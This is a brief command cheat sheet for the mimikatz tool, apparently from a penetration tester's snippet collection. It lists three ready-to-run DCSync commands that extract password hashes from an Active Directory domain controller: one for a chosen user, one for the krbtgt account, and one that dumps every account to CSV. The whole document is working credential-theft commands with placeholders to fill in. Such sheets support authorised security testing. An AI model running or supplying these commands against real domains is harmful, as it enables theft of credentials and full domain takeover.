# mimikatz

% mimikatz, passwords
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## dcsync - user 
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<domain_netbios>\<user>" "exit"
```

## dcsync - get krbtgt
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<domain_netbios>\krbtgt" "exit"
```

## dcsync - all (krbtgt/Administrator)
```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain_fqdn> /dc:<dc_fqdn> /all /csv" "exit"
```
